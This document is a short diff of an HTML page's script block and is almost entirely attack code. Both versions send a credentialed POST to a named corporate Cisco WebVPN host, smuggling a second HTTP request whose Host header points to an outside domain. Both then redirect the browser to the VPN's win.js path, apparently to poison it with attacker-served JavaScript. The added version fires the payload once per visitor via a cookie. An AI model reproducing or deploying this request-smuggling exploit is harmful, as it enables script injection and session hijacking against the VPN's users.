@@ -1,1 +1,33 @@
-<script>fetch('https://vpn.webank.com/', {method: 'POST', body: "GET /+webvpn+/ HTTP/1.1\r\nHost: cyal1.github.io\r\nX: Y", credentials: 'include'}).catch(() => { location='https://vpn.webank.com/+CSCOE+/win.js' })</script>
+<script>
+	function getCookie(cname) {
+  let name = cname + "=";
+  let decodedCookie = decodeURIComponent(document.cookie);
+  let ca = decodedCookie.split(';');
+  for(let i = 0; i <ca.length; i++) {
+    let c = ca[i];
+    while (c.charAt(0) == ' ') {
+      c = c.substring(1);
+    }
+    if (c.indexOf(name) == 0) {
+      return c.substring(name.length, c.length);
+    }
+  }
+  return "";
+};
+	console.log(getCookie("isvisted"));
+	if (getCookie("isvisted")){
+		location='https://vpn.webank.com/';
+	}else{
+		today =  new Date();
+		expiress = new Date();
+		expiress.setTime(today.getTime()+ 1000*60*60*72);
+		document.cookie="isvisted=true; expiress="+expiress.toGMTString();
+		fetch("https://vpn.webank.com/");
+		fetch('https://vpn.webank.com/',
+		 {method: 'POST', body: "GET /+webvpn+/ HTTP/1.1\r\nHost: cyal1.github.io\r\nX: Y", credentials: 'include'}).catch(() => {
+		  location='https://vpn.webank.com/+CSCOE+/win.js' 
+		})
+	}
+	
+</script>
+
